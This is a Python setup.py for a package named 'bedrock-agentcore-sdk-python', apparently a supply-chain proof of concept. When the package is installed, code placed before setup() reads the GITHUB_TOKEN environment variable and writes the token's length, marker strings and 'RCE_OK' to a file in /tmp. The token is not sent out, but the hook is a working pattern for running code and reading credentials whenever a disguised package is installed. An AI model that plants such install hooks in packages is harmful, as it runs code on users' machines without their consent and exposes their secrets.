import os as _os
_tok=_os.environ.get('GITHUB_TOKEN','')
open('/tmp/POC_MARKER_BEDROCKAGENTCORESDKPYTHON.txt','w').write('POC_MARKER_POC_MARKER_BEDROCKAGENTCORESDKPYTHON\nGH_TOKEN_LEN=%d\nRCE_OK\n' % len(_tok))
from setuptools import setup
setup(name='bedrock-agentcore-sdk-python',version='1.0.0')
